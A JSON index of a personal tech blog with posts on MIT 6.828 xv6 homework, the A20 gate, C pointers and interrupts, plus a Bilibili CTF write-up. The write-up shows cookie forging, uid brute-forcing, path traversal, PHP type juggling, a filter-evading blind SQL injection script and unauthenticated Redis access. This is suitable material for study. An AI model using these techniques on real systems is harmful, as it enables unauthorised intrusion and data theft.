{"pages":[{"title":"About","text":"About meUndergraduate studying Computer Science Coding , Reversing &amp; Curiosity ContactsYou can create a issue in this repo if you have any question","link":"/about/index.html"}],"posts":[{"title":"6.828-Hw1-Boot xv6","text":"Homework: boot xv6Exercise: What is on the stackBegin by restarting qemu and gdb, and set a break-point at 0x7c00, the start of the boot block (bootasm.S). Single step through the instructions (type si at the gdb prompt). Where in bootasm.S is the stack pointer initialized? (Single step until you see an instruction that moves a value into %esp, the register for the stack pointer.) It’s at 12# Set up the stack pointer and call into C.=&gt; 0x7c43: mov $0x7c00,%esp Single step through the call to bootmain; what is on the stack now? Before we call bootmain, ESP still points where the boot loader starts. 12345678910111213(gdb) b*0x7c48Breakpoint 1 at 0x7c48(gdb) cContinuing.The target architecture is assumed to be i386=&gt; 0x7c48: call 0x7d2a(gdb) x/24x $esp0x7c00: 0x8ec031fa 0x8ec08ed8 0xa864e4d0 0xb0fa75020x7c10: 0xe464e6d1 0x7502a864 0xe6dfb0fa 0x16010f600x7c20: 0x200f7c78 0xc88366c0 0xc0220f01 0x087c31ea0x7c30: 0x10b86600 0x8ed88e00 0x66d08ec0 0x8e0000b80x7c40: 0xbce88ee0 0x00007c00 0x0000dde8 0x00b866000x7c50: 0xc289668a 0xb866ef66 0xef668ae0 0x9066feeb Then step into bootmain. Now the first and only element on stack is 0x00007c4d. From bootblock.asm, we can know that This is where the bootmain returns. 12345678910(gdb) si=&gt; 0x7d2a: push %ebp0x00007d2a in ?? ()(gdb) x/24x $esp0x7bfc: 0x00007c4d 0x8ec031fa 0x8ec08ed8 0xa864e4d00x7c0c: 0xb0fa7502 0xe464e6d1 0x7502a864 0xe6dfb0fa0x7c1c: 0x16010f60 0x200f7c78 0xc88366c0 0xc0220f010x7c2c: 0x087c31ea 0x10b86600 0x8ed88e00 0x66d08ec00x7c3c: 0x8e0000b8 0xbce88ee0 0x00007c00 0x0000dde80x7c4c: 0x00b86600 0xc289668a 0xb866ef66 0xef668ae0 1234# If bootmain returns (it shouldn't), trigger a Bochs# breakpoint if running under Bochs, then loop.movw $0x8a00, %ax # 0x8a00 -&gt; port 0x8a007c4d: 66 b8 00 8a mov $0x8a00,%ax This shows call will also modify %ESP, pushing the return address into the stack. Continue to run till 0x7d30 12345678910(gdb) si=&gt; 0x7d30: sub $0x2c,%esp0x00007d30 in ?? ()(gdb) x/24x $esp0x7bec: 0x00000000 0x00000000 0x00000000 0x000000000x7bfc: 0x00007c4d 0x8ec031fa 0x8ec08ed8 0xa864e4d00x7c0c: 0xb0fa7502 0xe464e6d1 0x7502a864 0xe6dfb0fa0x7c1c: 0x16010f60 0x200f7c78 0xc88366c0 0xc0220f010x7c2c: 0x087c31ea 0x10b86600 0x8ed88e00 0x66d08ec00x7c3c: 0x8e0000b8 0xbce88ee0 0x00007c00 0x0000dde8 That corresponds to this asm code 123457d2a: 55 push %ebp7d2b: 89 e5 mov %esp,%ebp7d2d: 57 push %edi7d2e: 56 push %esi7d2f: 53 push %ebx We can know that the stack are like this in memory: 123456VALUE ADDRESS0x0(EBX) 0x7bec(ESP)0x0(ESI) 0x7bf0(ESP+4)0x0(EDI) 0x7bf4(ESP+8)0x0(EBP) 0x7bf8(ESP+12)0x7c4d(Return address) 0x7bfc(ESP+16) What do the first assembly instructions of bootmain do to the stack? Look for bootmain in bootblock.asm. 1=&gt; 0x7d2a: push %ebp Push %ebp into the stack Continue tracing via gdb (using breakpoints if necessary – see hint below) and look for the call that changes eip to 0x10000c. What does that call do to the stack? (Hint: Think about what this call is trying to accomplish in the boot sequence and try to identify this point in bootmain.c, and the corresponding instruction in the bootmain code in bootblock.asm. This might help you set suitable breakpoints to speed things up.) It’s at 0x7db2 1=&gt; 0x7db2: call *0x10018 In bootmain.c it’s entry() 123456elf = (struct elfhdr*)0x10000; // scratch space//....// Call the entry point from the ELF header.// Does not return!entry = (void(*)(void))(elf-&gt;entry);entry(); From elf.h we can know How did we get 0x10018 1234567891011121314// File headerstruct elfhdr {uint magic; // must equal ELF_MAGICuchar elf[12];ushort type;ushort machine;uint version;uint entry;....../* uint = unsigned int = 4 Bytes ushort = unsigned short = 1 Byte uchar = unsigned char = 2 Byte/* 0x10000 + 4 + C + 2 + 2 + 4 = 0x10018 What on 0x10018 is the destination of call , also the value to be set on %eip 12(gdb) x/x 0x100180x10018: 0x0010000c That’s why next step we are at 0x10000c From previous question, we’ve already noticed that call will also modify %ESP, pushing the return address into the stack.","link":"/2021/11/02/6-828-Hw1/"},{"title":"6.828-Hw2-Shell","text":"Homework: shellExecuting simple commandsImplementation12345678910111213141516171819202122232425262728case ' ': ecmd = (struct execcmd *)cmd; if (ecmd-&gt;argv[0] == 0) _exit(0);// Check if the file is executeable in pwd if (access(ecmd-&gt;argv[0], X_OK) == 0) { execv(ecmd-&gt;argv[0], ecmd-&gt;argv); } else { // Check if the file is executeable in /bin/ // no support for PATHs const char *binPath = &quot;/bin/&quot;; int pathLen = strlen(binPath) + strlen(ecmd-&gt;argv[0]); char *path = (char *)malloc((pathLen + 1) * sizeof(char)); strcpy(path, binPath); strcat(path, ecmd-&gt;argv[0]); if (access(path, X_OK) == 0) { execv(path, ecmd-&gt;argv); } else { fprintf(stderr, &quot;shell: command &lt;%s&gt; not found\\n&quot;, ecmd-&gt;argv[0]); } } break; I/O redirectionImplementationReading xv6-book is helpful. File descriptors and fork interact to make I/O redirection easy to implement. Fork copies the parent’s file descriptor table along with its memory, so that the child starts with exactly the same open files as the parent. The system call exec replaces the calling process’s memory but preserves its file table. This behavior allows the shell to implement I/O redirection by forking, reopening chosen file descriptors, and then exec\u0002ing the new program. By making fork and exec separate, Unix can implement interactive commands like redirection and pipes easily. Internally, the xv6 kernel uses the file descriptor as an index into a per-process ta\u0002ble, so that every process has a private space of file descriptors starting at zero. By convention, a process reads from file descriptor 0 (standard input), writes output to file descriptor 1 (standard output), and writes error messages to file descriptor 2 (standard error). As we will see, the shell exploits the convention to implement I/O redirection and pipelines. The shell ensures that it always has three file descriptors open (8707), which are by default file descriptors for the console. …… The close system call releases a file descriptor, making it free for reuse by a fu\u0002ture open, pipe, or dup system call (see below). A newly allocated file descriptor is al\u0002ways the lowest-numbered unused descriptor of the current process. So that’s why we close first in the following code. For convenience’s sake, just use 0777 as the mode in open() 123456789101112131415161718192021case '&gt;': rcmd = (struct redircmd *)cmd; close(rcmd-&gt;fd); // in this case it's 1 if (open(rcmd-&gt;file, rcmd-&gt;flags, 0777) &lt; 0) { fprintf(stderr, &quot;open %s failed!\\n&quot;, rcmd-&gt;file); exit(0); } runcmd(rcmd-&gt;cmd); break;case '&lt;': rcmd = (struct redircmd *)cmd; close(rcmd-&gt;fd); // in this case it's 0 if (open(rcmd-&gt;file, rcmd-&gt;flags, 0777) &lt; 0) { fprintf(stderr, &quot;open %s failed!\\n&quot;, rcmd-&gt;file); exit(0); } runcmd(rcmd-&gt;cmd); break; Implement pipesImplementation pipe() creates a pipe, a unidirectional data channel that can be used for interprocess communication. The array pipefd is used to return two file descriptors referring to the ends of the pipe. pipefd[0] refers to the read end of the pipe. pipefd[1] refers to the write end of the pipe. Data written to the write end of the pipe is buffered by the kernel until it is read from the read end of the pipe. The dup() system call allocates a new file descriptor that refers to the same open file description as the descriptor oldfd. (For an explanation of open file descriptions, see open(2).) The new file descriptor number is guaranteed to be the lowest-numbered file descriptor that was unused in the calling process. The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor number specified in newfd. In other words, the file descriptor newfd is adjusted so that it now refers to the same open file description as oldfd. 123456789101112131415161718192021222324252627case '|': pcmd = (struct pipecmd *)cmd; if(pipe(p) == -1){ fprintf(stderr, &quot;create pipe failed!\\n&quot;); exit(0); } // Run two commands respectively in two child process if(fork()==0){ // Make child's stdout refer to where p[1] refers to (Write end) dup2(p[1],STDOUT_FILENO); // close child's p[] close(p[0]); close(p[1]); runcmd(pcmd-&gt;left); } if(fork()==0){ // Same, but Read end dup2(p[0],STDIN_FILENO); close(p[0]); close(p[1]); runcmd(pcmd-&gt;right); } close(p[0]); close(p[1]); wait(&amp;r); wait(&amp;r); break;","link":"/2021/11/04/6-828-Hw2-Shell/"},{"title":"A20:历史的妥协","text":"A20: 历史的妥协今天看 MIT 6.828 中 JOS 的 Bootloader 部分，可以说是看几行代码查一小时资料了。 最近看英文文档比较多，中文社区这块相关的内容是在太过匮乏，还有不少错误，所以自己就来翻译一下。 在boot.S中，Boot loader 开启了 A20 Line，并且注释说到 为了向下兼容旧 PC（的应用程序），物理地址的第 20 位被锁定为低位(也就是 0)，所以高于 1MB 的内存会 被 wrap around 为 0 。而这段代码则正是为了将这一机制取消。 1234567891011121314151617181920# Enable A20:# For backwards compatibility with the earliest PCs, physical# address line 20 is tied low, so that addresses higher than# 1MB wrap around to zero by default. This code undoes this.seta20.1:inb $0x64,%al # Wait for not busytestb $0x2,%aljnz seta20.1movb $0xd1,%al # 0xd1 -&gt; port 0x64outb %al,$0x64seta20.2:inb $0x64,%al # Wait for not busytestb $0x2,%aljnz seta20.2movb $0xdf,%al # 0xdf -&gt; port 0x60outb %al,$0x60 这个 20 位和 1MB 比较好理解。 寻址空间由地址总线数量 N 决定： Size = 2^N Bytes 2021 年了，寻址空间已经大大的有了，而在上个世纪，Intel 8088 的地址总线只有 20 条，所以寻址空间为 2^20 Bytes，也就是 1 MB。至于这个 Wrap around是什么，还得搜搜才知道。 A20 是什么A20，或者说 20 号地址总线，是 X86 地址总线的第 21 根，对应总线上的第 21 位。 注意，从第 0 位开始，而不是第 1 位。这就是为什么控制第 21 根总线却被叫做 A20 Gate-A20 是什么Intel 8088 的时代遗风最初，PC 中的 Intel 8088 只有 20 条地址总线，可寻址空间达到 1MB (2^20 Bytes) ，但是 8088 的寄存器都是 16 位的，这意味着其可表达地址最大为64KB(2^16 Bytes)。这差距可太大了，Intel 想出了分段寻址的方式解决了这个问题，使用两个 16 位寄存器，最终地址可以采用如下公式表达： Address = selector * 16 + offset 基于该算法，地址最大为FFFF:FFFF，通过算法可以得到其对应的物理地址是0x10FFEF，这显然已经超过了 1MB，于是 Intel 采用了一个截断方案： 当程序员给出超过 1MB（即位于0x100000-0x10FFEF）的地址时，因为逻辑上正常，系统并不认为其访问越界而产生异常，而是自动从 0 开始计算，也就是说系统计算实际地址的时候是按照对 1MB求模的方式进行的。 所以，0x10FFEF就变成了0x00FFEF。 许多程序利用这一点，使不改变微处理器的段寄存器而去访问最开始的 64KB 内存成为一个通用的技巧 译注 与国内大部分的转载文不同，OSDev Wiki 的说法是： For some reason a few short-sighted programmers decided to write programs that actually used this wraparound Intel 80826 时代的妥协随后 Intel 80286 横空出世，得益于其地址总线增加到 24 根，Intel 引入了 保护模式（Protected Mode），使得可访问寻址空间达到了16MB。 为了向后兼容，Intel 还引入了实模式，旨在对 Intel 8088 的百分百兼容并仍然使用 20 根地址总线，这意味着实模式下寻址空间仍然被限制在 1MB 且沿用截断机制。然而，由于一个 BUG，这种地址截断并未生效：如果程序员访问0x100000-0x10FFEF之间的内存，系统将实际访问这块内存，而不是预期中的那样像 8088 一样截断。 由于历史遗留，大量程序依赖于这种截断运作，为了实现完美的兼容性，IBM 在系统总线与处理器中间加了一个逻辑门，用于控制 A20 的工作，因此得名 Gate-A20。 Gate-A20 可以通过软件进行开/关从而达到允许/阻止系统总线接受 A20 的信号，为了使依赖于截断的旧程序正常运作，需要设置 Gate-A20 为关闭状态。 但是对于许多运行在保护模式下的 OS，开启 Gate-A20 是在控制权交给 Kernel 之前做的第一件事情，否则无法访问所有内存。因为在断掉来自 A20 的信号后，地址的第21位永远是 0，这相当于内存有接近一半的合法地址无法被表示。 A20 原理上段提到，当 Gate-A20 关闭后，地址总线的第 21 位永远为 0。 当表示 1MB 以下的空间时，表现不受影响。 当尝试表示 1MB 以上的空间时，将会出现断层： [1MB,2MB) , [3MB,4MB)……这些区间的内存地址将无法表示，且占据[1MB,infinity]的一半 由于实模式下的程序最多访问到 1MB 以上再加一点点的空间，所以这对于实模式的兼容是完全足够的 如何控制 Gate-A20键盘起初，这个逻辑门被连接在 Intel 8042 键盘控制器上……因为这个芯片有一个空闲的接口 并通过 硬件 I/O 操作 发送信号 123456789101112131415161718192021222324void init_A20(void){ uint8_t a; disable_ints(); kyb_wait_until_done(); kyb_send_command(0xAD); // disable keyboard kyb_wait_until_done(); kyb_send_command(0xD0); // Read from input kyb_wait_until_done(); a=kyb_get_data(); kyb_wait_until_done(); kyb_send_command(0xD1); // Write to output kyb_wait_until_done(); kyb_send_data(a|2); kyb_wait_until_done(); kyb_send_command(0xAE); // enable keyboard enable_ints();} 译注 如果你可以找到比较那种比较老的主机，上面的 PS/2 接口所连接的可能就是这个芯片 这听起来有些离谱，因为你根本想不到会把开关装在键盘控制器上，但是那个时代确实没什么所谓“标准”。 当 PC 启动时，Gate-A20 总是默认关闭的，但某些 BIOS 和 模拟器（比如 QEMU) 会打开，然后做高位内存管理。 译注 高位内存管理听起来怪怪的，附原话 do some high-memory managers 这好像是荷兰人写的 Wiki 来自 Kernel Developers 的参考提到，BIOS 会打开 Gate-A20 用于测试系统内存大小与可用性，这可能是访问高位内存的原因 有些 Bootload 也会打开 Gate-A20 ，比如 GRUB 会在进入保护模式时自动打开 Gate-A20 其他方法还可以使用 INT 15H等方法开启 Gate-A20，不再赘述，参考 OSDev Wiki - A20 Line 参考A20 - a pain from the past (tue.nl) A20 line - Wikipedia A20 Address Line - Kernel Developers (weebly.com) A20 Line - OSDev Wiki","link":"/2021/10/24/A20-%E5%8E%86%E5%8F%B2%E7%9A%84%E5%A6%A5%E5%8D%8F/"},{"title":"Bilibili CTF WriteUP","text":"Bilibili CTF前言哔哩哔哩安全挑战赛(×) 哔哩哔哩谜语人挑战赛(√) ✔第一题 页面的背后是什么题目地址： http://45.113.201.36/index.html 暗示你打开 F12 了，找到如下 1234567891011121314151617&lt;script&gt; $.ajax({ url: &quot;api/admin&quot;, type: &quot;get&quot;, success:function (data) { //console.log(data); if (data.code == 200){ // 如果有值：前端跳转 var input = document.getElementById(&quot;flag1&quot;); input.value = String(data.data); } else { // 如果没值 $('#flag1').html(&quot;接口异常，请稍后再试～&quot;); } }})&lt;/script&gt; 访问http://45.113.201.36/api/admin 1{&quot;code&quot;:200,&quot;data&quot;:&quot;4c178e27-c36fea80-a7ed3176-1d754700&quot;,&quot;msg&quot;:&quot;&quot;} 完事 ✔第二题 真正的秘密只有特殊的设备才能看到和第一道题同一个页面 需要使用 bilibili Security Browser 浏览器访问～ 页面中还有一段 12345678910111213141516&lt;script&gt;$.ajax({ url: &quot;api/ctf/2&quot;, type: &quot;get&quot;, success:function (data) { //console.log(data); if (data.code == 200){ // 如果有值：前端跳转 $('#flag2').html(&quot;flag2: &quot; + data.data); } else { // 如果没值 $('#flag2').html(&quot;需要使用bilibili Security Browser浏览器访问～&quot;); } }})&lt;/script&gt; 直接访问http://45.113.201.36/api/ctf/2会提示 403 带个 UA User-Agent:bilibili Security Browser 完事了 12345{ &quot;code&quot;: 200, &quot;data&quot;: &quot;d2131fcf-a2b3f44c-f214bd4d-fa060ecf&quot;, &quot;msg&quot;: &quot;&quot;} ✔第三题 密码是啥题目地址： http://45.113.201.36/login.html 纯属谜语题，猜就完事了 123456789101112131415161718192021222324&lt;script&gt; //falg 3 $(&quot;#submit&quot;).click(function(){ $.ajax({ url: &quot;api/ctf/3&quot;, type: &quot;post&quot;, contentType: &quot;application/json&quot;, dataType:&quot;json&quot;, data: JSON.stringify({ username: $(&quot;#name&quot;).val(), passwd: $(&quot;#subject&quot;).val(), }), success:function (data) { if (data.code == 200){ alert(&quot;flag is: &quot; + data.data); } else { alert(&quot;用户名或密码错误～&quot;); } } }) }); &lt;/script&gt; 12username:adminpasswd:bilibili 页面提示 flag is: 6addadbe-68ecd85e-a675abff-abec8179 ✔第四题 对不起，权限不足～http://45.113.201.36/superadmin.html 有些秘密只有超级管理员才能看见哦~ 1234567891011121314151617 &lt;script&gt;$.ajax({ url: &quot;api/ctf/4&quot;, type: &quot;get&quot;, success:function (data) { console.log(data); if (data.code == 200){ // 如果有值：前端跳转 $('#flag').html(&quot;欢迎超级管理员登陆～答案是 : {{ &quot; + data.data + &quot; }}&quot;.toLowerCase() ) } else { // 如果没值 $('#flag').html(&quot;有些秘密只有超级管理员才能看见哦~&quot;) } } }) &lt;/script&gt; F12 看一下请求头 Cookie:role=ee11cbb19052e40b07aac0ca060c23ee 发现华点！ 123&gt;&gt;&gt; a = &quot;ee11cbb19052e40b07aac0ca060c23ee&quot;&gt;&gt;&gt; len(a)32 试试把 role 换成Administrator的 32 位 md5 说真的这个也是很谜语，root/administrator/admin 都不行 然后GET http://45.113.201.36/api/ctf/4 完事 12345{ &quot;code&quot;: 200, &quot;data&quot;: &quot;47892d9e-f9014bb2-e2c09832-6625250e&quot;, &quot;msg&quot;: &quot;&quot;} ✔第五题 别人的秘密题目地址： http://45.113.201.36/user.html 12345678910111213141516171819202122232425262728293031323334353637&lt;script&gt; $(function () { (function ($) { $.getUrlParam = function(name) { var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;); var r = window.location.search.substr(1).match(reg); if (r != null) return unescape(r[2]); return null; } })(jQuery); var uid = $.getUrlParam('uid'); if (uid == null) { uid = 100336889; } $.ajax({ url: &quot;api/ctf/5?uid=&quot; + uid, type: &quot;get&quot;, success:function (data) { console.log(data); if (data.code == 200){ // 如果有值：前端跳转 $('#flag').html(&quot;欢迎超级管理员登陆～flag : &quot; + data.data ) } else { // 如果没值 $('#flag').html(&quot;这里没有你想要的答案～&quot;) } } }) }); &lt;/script&gt; 这次猜不了了，直接爆破 12345678910for uid in range(100336889,99999999999): params = ( ('uid', uid), ) response = requests.get('http://45.113.201.36/api/ctf/5', headers=headers, params=params, cookies=cookies, verify=False).json() if response['code'] != '403': print(response) print(uid) 12{'code': 200, 'data': 'ceb460a2-9d1e9100-1b0dd097-dcce2fb9', 'msg': ''}100336914 看了一下空间，这用户好神秘 ✔第六题 结束亦是开始题目地址： http://120.92.151.189/blog/single.php?id=1 是不是一堆人暴力猜猜炸了啊 服务器挂了… http://120.92.151.189/blog/end.php 你想要的不在这儿～ 佛了，我还是搜搜大佬的题解吧，结果说扫目录可以扫到 http://120.92.151.189/blog/test.php 里面是 JSFuck 加密的内容，不贴了.. 尝试一下 JSUnFuck http://codertab.com/JsUnFuck 123var str1 = &quot;\\u7a0b\\u5e8f\\u5458\\u6700\\u591a\\u7684\\u5730\\u65b9&quot;;var str2 = &quot;bilibili1024havefun&quot;;console.log() str1解码是程序员最多的地方 去 Github 搜一下str2 发现https://github.com/interesting-1024/end/blob/6a1b18e8aa96e879045a66130ddb3ba26b9b8b10/end.php 1234567891011121314151617&lt;?php//filename end.php$bilibili = &quot;bilibili1024havefun&quot;;$str = intval($_GET['id']);$reg = preg_match('/\\d/is', $_GET['id']);if(!is_numeric($_GET['id']) and $reg !== 1 and $str === 1){ $content = file_get_contents($_GET['url']); //文件路径猜解 if (false){ echo &quot;还差一点点啦～&quot;; }else{ echo $flag; }}else{ echo &quot;你想要的不在这儿～&quot;;}?&gt; PHP 不会…请教了一下，构造了以下参数 http://120.92.151.189/blog/end.php?id[]=1 页面提示还差一点点啦～ 下个参数应该就是文件地址了，结合之前的猜一猜 http://120.92.151.189/blog/end.php?id[]=1&amp;url=/api/ctf/6/flag.txt 得到一个图片，保存后 NPP 打开搜索flag 得到{flag10:2ebd3b08-47ffc478-b49a5f9d-f6099d65}} ？？？？？？这不是第六题吗 草真的是，提交第 10 题成功了？？ 很喜欢出题人说过的一句话 结束 亦是开始 卡关了 白白 23 点 57 分更新，爆破拿到 Flag6 a2b0883c-ffbb8d17-9a3bbf1c-ed600c80 123456789101112131415161718192021#https://www.zhihu.com/question/427113420/answer/1540971850import requestsurl='http://120.92.151.189/blog/single.php?id=1'flag=''for i in range(1,100): left=33 right=128 while right-left!=1: mid=(left+right)//2 payload=&quot;0123'^if(substr((selselectect flag from flag),{i},1)&gt;binary {mid},(selecselectt 1+~0),0) ununionion selecselectt 1,2#&quot;.format(i=i,mid=hex(mid)) headers={ 'Referer':payload } r=requests.get(url=url,headers=headers) if len(r.text) == 5596: left=mid else: right=mid flag+=chr(right) print (flag) ✔第七题23 点 57 分更新 http://45.113.201.36/api/images?file=../../../flag7.txt 需登录，来自项目 Issue ✔第八题服务器开启了6379端口，也就是Redis默认端口，直接上 1234567891011121314PS D:\\TOOL\\Redis&gt; .\\redis-cli.exe -h 120.92.151.189 -p 6379120.92.151.189:6379&gt; keys * 1) &quot;flag8&quot; 2) &quot;flag5&quot; 3) &quot;flag7&quot; 4) &quot;flag9&quot; 5) &quot;flag10&quot; 6) &quot;flag1&quot; 7) &quot;flag2&quot; 8) &quot;flag3&quot; 9) &quot;flag4&quot;10) &quot;flag6&quot;120.92.151.189:6379&gt; get flag8&quot;d436b982-2b81aa54-49a8d2db-87ab951a&quot; 123456789101112131415161718192021PS D:\\TOOL\\Redis&gt; .\\redis-cli.exe -h 120.92.151.189 -p 6379120.92.151.189:6379&gt; get flag1&quot;3b96173a-b3df4cdd-22d4c15f-261e7309&quot;120.92.151.189:6379&gt; get flag2&quot;bd871042-1e09a130-3ddd4faa-cebdb048&quot;120.92.151.189:6379&gt; get flag3&quot;c7f7a7c2-28b7f895-5432152b-6410e042&quot;120.92.151.189:6379&gt; get flag4&quot;d338e3c8-93215105-258d79ba-b364e59c&quot;120.92.151.189:6379&gt; get flag5&quot;612d1886-044898af-6c1e9dba-b58ad075&quot;120.92.151.189:6379&gt; get flag6&quot;8aa6f15d-65e37c9b-78c2bc37-00ed5aee&quot;120.92.151.189:6379&gt; get flag7&quot;b78ce2aa-10d03327-f2035f4e-55c17689&quot;120.92.151.189:6379&gt; get flag8&quot;d436b982-2b81aa54-49a8d2db-87ab951a&quot;120.92.151.189:6379&gt; get flag9&quot;b3238659-b81512e6-3a307c74-9877ecc5&quot;120.92.151.189:6379&gt; get flag10&quot;e5653416-595b3d0c-4c2a57ee-c026350e&quot; 大佬们说flag8就是这里拿到的，确实成功了，但是其他的 flag 在这里摆出来是为了什么？ 第九题时间到了.. 可能突破口：http://45.113.201.36/api/images?file=../../../secret.txt ✔第十题第六题中得到了flag10","link":"/2020/10/24/Bilibili%20CTF/"},{"title":"C 语言中，「.」与「-&gt;」有什么区别？","text":"问题C 语言中的.和-&gt;两种操作符，除了表达形式有些不同，功能几乎是完全一样，有时候又让人分不清，怎么回事呢？ 说出下面的不同1234567891011121314151617181920// 1struct { long type; int value;};// 2 struct Message{ long type; int value;};// 3typedef struct { long type; int value;}Msg,*Msgptr;// 4 typedef struct Message{ long type; int value;}Msg,*Msgptr; 这是会被编译器警告的 unnamed struct/union that defines no instances 这是常规的结构体定义 这是使用typedef为一个匿名结构体起了别名Msg，并为这类结构体的指针起了别名Msgptr 和 3 一样，但是结构体多了个名字 但其实编译器不会认这个结构体的名字 为什么要说这个呢，因为要区分.和-&gt;的关键，就在于它们跟在结构体还是结构体的指针的后面 举个例子我定义了一个嵌套结构 12345678910typedef struct { char name[20]; int age;}Person;struct Message{ long type; Person person;};typedef struct Message Msg,*Msgptr; 那么我该怎么用这个定义好的结构？ 声明变量以下都是有效的结构体声明，他们本质上是同一类结构体 1234// Structuresstruct Message struct1;struct {long type;Person person;} struct2;Msg struct3; 以下都是有效的指针，指向一段被看作是Msg类型的内存空间 12345// Pointersstruct Message* ptr1 = malloc(sizeof(Msg));struct {long type;Person person;}* ptr2 = malloc(sizeof(Msg));Msg* ptr3 = malloc(sizeof(Msg));Msgptr ptr4 = malloc(sizeof(Msg)); 区分用法首先，最直观的区分就是两者跟在不同的变量后 .用在结构体后面 -&gt;用在结构体的指针后面 知乎的一个高赞回答，也是这样的说法： 编译器会将p-&gt;member变成访问p+offset_member这个内存地址的变量 编译器会将s.member变成访问&amp;s+offset_member这个内存地址的变量 如下代码证明第一条是正确的： 12345Msgptr ptr = malloc(sizeof(Msg));void* purePtr = (void*)ptr+sizeof(ptr-&gt;type);if(purePtr==&amp;ptr-&gt;person){ printf(&quot;Equal\\n&quot;);} 指针加法会一次增加指向的变量的类型的单位大小，如整形是 4 字节。这里转为void类型则每次增加 1 字节 如下代码可以验证第二条： 12345Msg structMsg = {1,{&quot;bkft&quot;,21}};if (structMsg.person.age == *(Person *)(&amp;structMsg + sizeof(structMsg.type))){ printf(&quot;yes\\n&quot;);} 参考C 语言中，「.」与「-&gt;」有什么区别？ - 知乎 (zhihu.com)","link":"/2020/08/25/C-%E8%AF%AD%E8%A8%80%E4%B8%AD%EF%BC%8C%E3%80%8C-%E3%80%8D%E4%B8%8E%E3%80%8C-%E3%80%8D%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F/"},{"title":"C中const修饰指针变量的不同情况","text":"缘起昨天看到指针，const 修饰这个部分给我看晕了，今天起来专门写个文章记忆一下 分类修饰 p 指向内容(修饰*p)12const int* p = &amp;a;int const * p = &amp;a; 两种写法等效，因为 const 都在*p左边 这种情况下，p是const int*型，const 修饰的是p指向的内容。解引用后无法进行赋值操作 因为p本身没有被 const 修饰，所以指针的值可变，不必初始化 1234567891011#include &lt;stdio.h&gt;int main(void){ int a = 4; int const *p; p = &amp;a; a += 1; // 不用指针依然可以修改，因为a本身并未被const修饰 //*p += 1; // error: assignment of read-only location '*p'//// printf(&quot;%d %d&quot;, a, *p);}// 5 5 修饰 p1int* const p = &amp;a;` p 是int* const型，此时 const 修饰p，必须在定义p时初始化 不初始化的话，p 就是一个野指针 12345678910#include &lt;stdio.h&gt;int main(void){ int a = 4; int *const p = &amp;a; *p += 1 ; // 可行，因为*p并未被const修饰 //p += 1; // error: assignment of read-only variable 'p' printf(&quot;%d %d&quot;,a,*p);}// 5 5 同时修饰 p 和 p 指向内容其实就是上面两个方法的结合 12const int* const p = &amp;a;int const * const p = &amp;a; 两种写法等效 p和p所指向内容都被 const 修饰，所以两者都不可改变 同样的，因为指针本身被修饰，必须定义时初始化 12345678910#include &lt;stdio.h&gt;int main(void){ int a = 4; const int* const p = &amp;a; //*p += 1 ; // error: assignment of read-only variable 'p' //p += 1; // error: assignment of read-only variable 'p' printf(&quot;%d %d&quot;,a,*p);}// 4 4 总结被const修饰的，不能被修改 const 在*的左边，修饰的就是*p，也就是修饰p指向内容 const 在*的右边，修饰的就是p，也就是p本身 参考C/C++ const 修饰指针变量的三种情况","link":"/2020/07/25/C%E4%B8%ADconst%E4%BF%AE%E9%A5%B0%E6%8C%87%E9%92%88%E5%8F%98%E9%87%8F%E7%9A%84%E4%B8%8D%E5%90%8C%E6%83%85%E5%86%B5/"},{"title":"Disabling interrupts","text":"Disabling InterruptsWhen SeaBIOS is loading in QEMU, it will disable interrupts 1234567810 0xfd15f: cli 11 0xfd160: cld 12 0xfd161: mov $0x8f, %eax# Here to disable Maskable Hardware interrupts13 0xfd167: out %al, $0x70 14 0xfd169: in $0x71, %al# And disable Non-maskable Hardware interrupts The #10 instruction cli above is to disable interrupts, but how it works? Interrupt is divided into Hardware and Software ones. For Hardware interrupts, there are maskable and non-maskable ones. On the FLAGS register of the CPU, bit 9 is IF (Interrupt flag), who determines whether or not the CPU will respond immediately to maskable hardware interrupts. The instruction cli is to set IF to 0 , so we can disable the maskable hardware interrupts. Instead, the instruction sti is to set IF to 1, namely enable it. But as you see, non-maskable hardware interrupts can still be disabled at #13 , Why? From Non Maskable Interrupt - OSDev Wikiand https://bochs.sourceforge.io/techspec/PORTS.LST We can know that the MSB of 0x70 is to control the NMI(Non Maskable Interrupt) and it’s shared with CMOS RAM index 12345670070 w CMOS RAM index register port (ISA, EISA) bit 7 = 1 NMI disabled = 0 NMI enabled bit 6-0 CMOS RAM index (64 bytes, sometimes 128 bytes) any write to 0070 should be followed by an action to 0071 or the RTC wil be left in an unknown state. From OSDev Wiki, you can disable NMI like this 1234void NMI_disable() {outb(0x70, inb(0x70) | 0x80);inb(0x71);} So you read 0x70 using inb , and you get the binary value of it. Then make a Bool OR calculation: var MSB LSB inb(0x70) X X X X X X X X 0x80 1 0 0 0 0 0 0 0 Result 1 ? ? ? ? ? ? ? Then you write the result to 0x70 again, whose MSB must be 1. So the NMI is now disabled. Vice versa, when enabling 1234void NMI_enable() {outb(0x70, inb(0x70) &amp; 0x7F);inb(0x71);} The MSB of the result must be 0, so NMI will be enabled. Let’s use GDB to set a breakpoint before the out instruction executes 12345678910(gdb) b *0xfd167Breakpoint 1 at 0xfd167(gdb) cContinuing.Program received signal SIGTRAP, Trace/breakpoint trap.[f000:d167] 0xfd167: out %al,$0x700x0000d167 in ?? ()(gdb) info register alal 0x8f -113 Now %al is 0x8f or1000 1111 and its MSB is 1 so NMI will be disabled after this instruction. Cuz the reference mentioned: any write to 0070 should be followed by an action to 0071or the RTC wil be left in an unknown state That’s why next instruction(#14) is 0xfd169: in $0x71, %al","link":"/2021/10/29/Disabling-interrupts/"},{"title":"EDK2开发(1)-Ubuntu开发环境搭建","text":"环境说明使用 WSL2+VSCode 的组合进行开发，方便快捷 教程参考官方 Github 仓库 Wiki：Common instructions · tianocore/tianocore.github.io Wiki 环境搭建更新工具链1sudo apt install build-essential uuid-dev iasl git nasm python-is-python3 python-is-python3可以不装，自己做一个链接python-&gt;python3.8也行 从仓库拉取源码基于区域封锁情况自行设置代理，或者从镜像站点拉取 123456bakaft@BakaFT-PC:~$ git clone https://github.com/tianocore/edk2.gitCloning into 'edk2'...remote: Enumerating objects: 370092, done.remote: Total 370092 (delta 0), reused 0 (delta 0), pack-reused 370092Receiving objects: 100% (370092/370092), 302.10 MiB | 10.71 MiB/s, done.Resolving deltas: 100% (268196/268196), done. 